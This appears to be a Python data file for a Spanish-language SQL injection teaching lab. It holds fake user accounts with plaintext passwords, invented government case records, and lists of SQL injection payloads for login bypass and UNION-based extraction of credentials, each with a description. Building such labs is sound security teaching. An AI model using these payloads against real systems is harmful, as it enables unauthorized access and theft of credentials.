# Base de datos de prueba para el laboratorio de inyección SQL

USERS = [
    (1, "admin", "password123", "Administrador", "Sistemas"),
    (2, "auditor", "auditor2026", "Auditor", "Auditoria"),
    (3, "invitado", "uabc2026", "Consulta", "Publico"),
    (4, "director", "dir2026", "Director", "Direccion"),
    (5, "empleado1", "emp123", "Empleado", "RH"),
    (6, "empleado2", "emp456", "Empleado", "Finanzas"),
    (7, "usuario_test", "test", "Usuario", "Test"),
]

EXPEDIENTES = [
    ("GOB-2026-001", "Mariana Lopez", "Salud", "En revision", "Expediente de solicitud de beca"),
    ("GOB-2026-002", "Carlos Vega", "Finanzas", "Aprobado", "Solicitud de presupuesto"),
    ("GOB-2026-003", "Ana Torres", "Obras Publicas", "Pendiente", "Proyecto de infraestructura"),
    ("GOB-2026-004", "Luis Rojas", "Educacion", "Archivado", "Programa educativo finalizado"),
    ("GOB-2026-005", "Patricia Morales", "Salud", "En revision", "Amparo en materia de salud"),
    ("GOB-2026-006", "Roberto Silva", "Justicia", "Aprobado", "Resolución de conflicto laboral"),
    ("GOB-2026-007", "Isabel Mendez", "Ambiente", "Pendiente", "Evaluación ambiental"),
    ("GOB-2026-008", "Fernando Rios", "Desarrollo", "En revision", "Proyecto productivo"),
]

# Inyecciones SQL de ejemplo para demostración
INJECTION_EXAMPLES = [
    {
        "name": "Bypass simple",
        "user": "admin' --",
        "pass": "cualquier_cosa",
        "description": "Los guiones ignoran la validación de contraseña"
    },
    {
        "name": "OR siempre verdadero",
        "user": "' OR '1'='1",
        "pass": "' OR '1'='1",
        "description": "Accede como el primer usuario (admin)"
    },
    {
        "name": "UNION - obtener usuarios",
        "user": "' UNION SELECT id, username, password, role FROM users --",
        "pass": "x",
        "description": "Combina resultados de dos queries"
    },
    {
        "name": "Comentario SQL",
        "user": "admin'/*",
        "pass": "*/",
        "description": "Los comentarios /* */ funcionan en SQLite"
    },
    {
        "name": "Acceso específico",
        "user": "auditor' --",
        "pass": "ignorado",
        "description": "Accede como usuario auditor sin saber contraseña"
    },
]

SEARCH_INJECTION_EXAMPLES = [
    {
        "name": "Ver todo",
        "term": "%' OR '1'='1",
        "description": "Retorna todos los expedientes"
    },
    {
        "name": "Extraer información",
        "term": "%' UNION SELECT id, username, password, role FROM users LIMIT 1--",
        "description": "Intenta extraer usuarios (ajusta según BD)"
    },
    {
        "name": "Truncamiento",
        "term": "GOB%",
        "description": "Búsqueda normal con wildcard"
    },
]
